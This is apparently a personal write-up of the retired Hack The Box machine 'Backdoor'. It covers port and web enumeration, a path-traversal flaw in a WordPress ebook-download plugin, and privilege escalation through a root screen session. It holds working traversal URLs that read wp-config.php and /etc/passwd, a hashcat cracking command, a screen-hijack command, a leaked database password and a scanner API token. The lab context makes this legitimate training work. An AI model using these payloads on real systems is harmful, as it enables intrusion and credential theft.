---
tags:
  - HTB
  - Retired
  - Linux
  - WordPress
  - Screen
  - gdbserver
creation date: 2021-11-20
Date Completed: 2024-09-21
CVEs: 
URL: https://app.hackthebox.com/machines/Backdoor
IP: 10.129.96.68
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
enumify.sh -H 10.129.96.68 -t All
```

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
### ffuf (Directories/Subdomain/Files)
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt:FUZZ -u $URL/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt:FUZZ -u $URL/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.domain.htb" -c
```

### wpscan


```
wpscan --url "http://backdoor.htb/wp-content/" -v -e --plugins-detection aggressive --api-token QqoyStKXPlydupJbq5IDVOLxt16WvSSXrkj1Pas5gaY
```

![[Pasted image 20240921091353.png]]

## Getting a foothold

https://www.exploit-db.com/exploits/39575

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

![[Pasted image 20240921091521.png]]

wordpressuser:MQYBJSaD#DxG6qbm
MQYBJSaD#DxG6qbm

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
```

```
backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../etc/apache2/sites-enabled/backdoor.htb.conf
```

### Getting the processes 

```
curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o- | xxd
```


### Getting  RCE

https://www.exploit-db.com/exploits/50539

## Enumerating from the inside

```
mysql -u wordpressuser -p -P 33060
Enter password: MQYBJSaD#DxG6qbm
```


### crack the wordpress admin password

```
hashcat -m 400 admin_hash ~/tools/rockyou.txt
```

## Priv Esc

Hijack screen session

```
export TERM=xterm
screen -x root/root
```